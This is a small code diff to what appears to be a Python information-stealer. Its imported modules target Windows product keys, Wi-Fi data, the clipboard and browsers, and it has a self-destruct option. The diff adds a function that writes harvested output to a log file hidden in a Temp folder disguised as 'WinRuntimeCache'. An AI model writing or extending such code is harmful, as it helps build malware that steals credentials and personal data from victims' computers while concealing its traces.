@@ -42,6 +42,7 @@ from scripts.system import productkey
 from scripts.system import wifi
 from scripts.system import clipboard
 from scripts.browsers import geckodriver
+from os import environ, sep
 
 def Start() -> None:
     if not Config.debuging:
@@ -106,6 +107,12 @@ def End() -> None:
     except Exception as e:
         print(e)
     ending.End(Config.np, Config.selfDestruct)
+
+def WriteOutput(string) -> None:
+    pathf = environ['USERPROFILE'] + sep + r'AppData\Local'
+    file = open(rf'{pathf}\Temp\WinRuntimeCache\log.txt', "w+", encoding='utf-8')
+    file.write(string)
+    file.close()
 
 def Main()-> None:
     Start()
